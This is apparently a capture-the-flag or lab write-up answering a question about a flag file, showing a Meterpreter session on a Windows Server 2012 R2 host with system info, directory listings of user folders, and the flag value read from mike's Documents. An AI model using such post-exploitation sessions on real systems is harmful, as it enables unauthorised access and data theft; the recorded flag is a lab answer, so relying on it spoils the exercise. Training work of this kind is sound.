## 33. A system contains the file C:\Users\mike\Documents\flag.txt; what is the value of the flag?

I understand that I only have one attempt at this answer. After clicking _Submit answer_, I will not be able to make edits. Your answer will be graded based on the state of the lab environment at the time it is submitted.

Submit answer

Case-sensitive answer. Please enter text as displayed.


```bash
meterpreter > sysinfo
Computer    : WINSERVER-01
OS          : Windows NT WINSERVER-01 6.3 build 9600 (Windows Server 2012 R2 Standard Edition) AMD64
Meterpreter : php/windows
meterpreter > 
meterpreter > 
meterpreter > cat C:/Users/mike/Documents/flag.txt
f4f7595f93f14cfcb745e07fe8ea5058
meterpreter > 
```


```bash
meterpreter > sysinfo
Computer    : WINSERVER-01
OS          : Windows NT WINSERVER-01 6.3 build 9600 (Windows Server 2012 R2 Standard Edition) AMD64
Meterpreter : php/windows
meterpreter > ifconfig
[-] The "ifconfig" command is not supported by this Meterpreter type (php/windows)
meterpreter > ipconfig
[-] The "ipconfig" command is not supported by this Meterpreter type (php/windows)
meterpreter > ls c:
Listing: c:
===========

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2022-04-18 13:13:01 +0530  $Recycle.Bin
100666/rw-rw-rw-  543     fil   2022-04-19 03:13:01 +0530  .htaccess
100666/rw-rw-rw-  1       fil   2013-06-18 17:48:29 +0530  BOOTNXT
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:32 +0530  Documents and Settings
40777/rwxrwxrwx   0       dir   2022-04-18 11:47:15 +0530  EFS Software
40555/r-xr-xr-x   4096    dir   2022-04-18 12:32:02 +0530  PerfLogs
40777/rwxrwxrwx   4096    dir   2022-04-18 15:07:52 +0530  Program Files
40777/rwxrwxrwx   4096    dir   2022-04-18 15:07:52 +0530  Program Files (x86)
40777/rwxrwxrwx   0       dir   2021-12-31 13:30:32 +0530  ProgramData
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:32 +0530  System Volume Information
40777/rwxrwxrwx   4096    dir   2022-04-19 02:18:47 +0530  Users
                                                           Windows
100444/r--r--r--  398356  fil   2014-03-18 15:35:18 +0530  bootmgr
40777/rwxrwxrwx   0       dir   2022-04-18 13:24:10 +0530  inetpub
40777/rwxrwxrwx   0       dir   2013-08-22 21:22:33 +0530  pagefile.sys
40777/rwxrwxrwx   24576   dir   2022-04-19 02:15:11 +0530  wamp64

meterpreter > ls C:/
Listing: C:/
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2022-04-18 13:13:01 +0530  $Recycle.Bin
100666/rw-rw-rw-  543     fil   2022-04-19 03:13:01 +0530  .htaccess
100666/rw-rw-rw-  1       fil   2013-06-18 17:48:29 +0530  BOOTNXT
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:32 +0530  Documents and Settings
40777/rwxrwxrwx   0       dir   2022-04-18 11:47:15 +0530  EFS Software
40555/r-xr-xr-x   4096    dir   2022-04-18 12:32:02 +0530  PerfLogs
40777/rwxrwxrwx   4096    dir   2022-04-18 15:07:52 +0530  Program Files
40777/rwxrwxrwx   4096    dir   2022-04-18 15:07:52 +0530  Program Files (x86)
40777/rwxrwxrwx   0       dir   2021-12-31 13:30:32 +0530  ProgramData
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:32 +0530  System Volume Information
40777/rwxrwxrwx   4096    dir   2022-04-19 02:18:47 +0530  Users
                                                           Windows
100444/r--r--r--  398356  fil   2014-03-18 15:35:18 +0530  bootmgr
40777/rwxrwxrwx   0       dir   2022-04-18 13:24:10 +0530  inetpub
40777/rwxrwxrwx   0       dir   2013-08-22 21:22:33 +0530  pagefile.sys
40777/rwxrwxrwx   24576   dir   2022-04-19 02:15:11 +0530  wamp64



s
meterpreter > ls C:/Users/
Listing: C:/Users/
==================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2021-12-31 15:20:14 +0530  Administrator
40777/rwxrwxrwx   4096  dir   2022-04-18 15:07:52 +0530  All Users
40555/r-xr-xr-x   8192  dir   2021-12-31 13:30:58 +0530  Default
40555/r-xr-xr-x   8192  dir   2021-12-31 13:30:58 +0530  Default User
40555/r-xr-xr-x   4096  dir   2014-05-21 08:19:18 +0530  Public
100666/rw-rw-rw-  174   fil   2013-08-22 21:07:57 +0530  desktop.ini
40777/rwxrwxrwx   8192  dir   2022-04-18 13:10:37 +0530  mike

meterpreter > ls C:/Users/mike
Listing: C:/Users/mike
======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2014-05-09 05:34:33 +0530  AppData
40777/rwxrwxrwx   0       dir   2014-05-09 05:34:53 +0530  Application Data
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Contacts
40777/rwxrwxrwx   0       dir   2022-04-18 13:10:37 +0530  Cookies
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:38 +0530  Desktop
40555/r-xr-xr-x   4096    dir   2025-12-13 21:07:29 +0530  Documents
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Downloads
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:38 +0530  Favorites
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:38 +0530  Links
40777/rwxrwxrwx   4096    dir   2022-04-18 13:10:38 +0530  Local Settings
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Music
40555/r-xr-xr-x   4096    dir   2025-12-13 21:07:29 +0530  My Documents
100666/rw-rw-rw-  524288  fil   2025-12-13 21:17:44 +0530  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2022-04-18 13:25:05 +0530  NTUSER.DAT{9c9f9f65-ae7e-11e3-80ba-0026b955dac2}.TM.blf
100666/rw-rw-rw-  524288  fil   2022-04-18 13:25:05 +0530  NTUSER.DAT{9c9f9f65-ae7e-11e3-80ba-0026b955dac2}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2022-04-18 13:25:05 +0530  NTUSER.DAT{9c9f9f65-ae7e-11e3-80ba-0026b955dac2}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   0       dir   2013-08-22 21:09:30 +0530  NetHood
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Pictures
40777/rwxrwxrwx   0       dir   2013-08-22 21:09:30 +0530  PrintHood
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Recent
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Saved Games
40555/r-xr-xr-x   4096    dir   2022-04-18 13:10:38 +0530  Searches
40555/r-xr-xr-x   4096    dir   2021-12-15 09:58:19 +0530  SendTo
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Start Menu
40777/rwxrwxrwx   0       dir   2013-08-22 21:09:30 +0530  Templates
40555/r-xr-xr-x   0       dir   2022-04-18 13:10:38 +0530  Videos
100666/rw-rw-rw-  376832  fil   2022-04-18 13:10:36 +0530  ntuser.dat.LOG1
100666/rw-rw-rw-  0       fil   2022-04-18 13:10:36 +0530  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2014-05-09 05:34:33 +0530  ntuser.ini

meterpreter > ls C:/Users/mike/Documents/
Listing: C:/Users/mike/Documents/
=================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40555/r-xr-xr-x   0     dir   2022-04-18 13:10:38 +0530  My Music
40555/r-xr-xr-x   0     dir   2022-04-18 13:10:38 +0530  My Pictures
40555/r-xr-xr-x   0     dir   2022-04-18 13:10:38 +0530  My Videos
100666/rw-rw-rw-  402   fil   2022-04-18 13:10:38 +0530  desktop.ini
100666/rw-rw-rw-  34    fil   2025-12-13 21:07:29 +0530  flag.txt

meterpreter > cat C:/Users/mike/Documents/flag.txt
f4f7595f93f14cfcb745e07fe8ea5058
meterpreter > 
```